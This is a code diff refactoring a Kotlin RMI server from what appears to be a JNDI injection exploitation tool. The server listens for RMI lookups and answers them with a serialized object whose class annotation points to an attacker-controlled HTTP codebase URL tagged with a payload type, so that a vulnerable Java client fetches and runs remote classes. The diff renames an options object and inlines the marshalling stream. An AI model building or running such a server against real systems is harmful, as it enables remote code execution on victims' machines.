@@ -6,21 +6,20 @@ import sun.rmi.transport.TransportConstants
 import util.*
 import java.io.*
 import java.net.URL
-import java.net.URLClassLoader
 import java.rmi.server.ObjID
 import java.rmi.server.RemoteObject
 import java.rmi.server.UID
 import javax.naming.Reference
 
 class RMIServer {
-    private val port = Options.rmiPort
-    private val codebase = URL("http://${Options.address}:${Options.httpPort}/")
+    private val port = Option.rmiPort
+    private val codebase = URL("http://${Option.address}:${Option.httpPort}/")
 
     private fun log(text: String) = println("RMI >> ".purple() + text)
 
     fun run() {
         val server = java.net.ServerSocket(port)
-        log("Listening on ${Options.address}:$port".blue())
+        log("Listening on ${Option.address}:$port".blue())
 
         while (true) {
             val socket = server.accept().apply { soTimeout = 5000 }
@@ -132,7 +131,12 @@ class RMIServer {
         val payloadType = path.substringAfter("/")
 
         dos.writeByte(TransportConstants.Return.toInt())
-        val mos = MarshalOutputStream(dos, URL("$codebase#$payloadType")).apply {
+        val mos = object : ObjectOutputStream(dos) {
+            val url = URL("$codebase#$payloadType")
+
+            override fun annotateClass(cl: Class<*>?) = writeObject(url.toString())
+            override fun annotateProxyClass(cl: Class<*>?) = annotateClass(cl)
+        }.apply {
             writeByte(TransportConstants.NormalReturn.toInt())
             UID().write(this)
         }
@@ -172,25 +176,5 @@ class RMIServer {
         oiStream.readInt()
         oiStream.readLong()
         log("A DGC call for ${oiStream.readObject() as Array<*>}")
-    }
-}
-
-class MarshalOutputStream(stream: OutputStream, val url: URL?) : ObjectOutputStream(stream) {
-    override fun annotateClass(cl: Class<*>?) {
-        if (url != null) {
-            writeObject(url.toString())
-        } else if (cl?.classLoader !is URLClassLoader) {
-            writeObject(null)
-        } else {
-            val urls = (cl.classLoader as URLClassLoader).urLs
-            val sum = urls.fold("") { sum, url ->
-                sum + url.toString()
-            }
-            writeObject(sum)
-        }
-    }
-
-    override fun annotateProxyClass(cl: Class<*>?) {
-        annotateClass(cl)
     }
 }
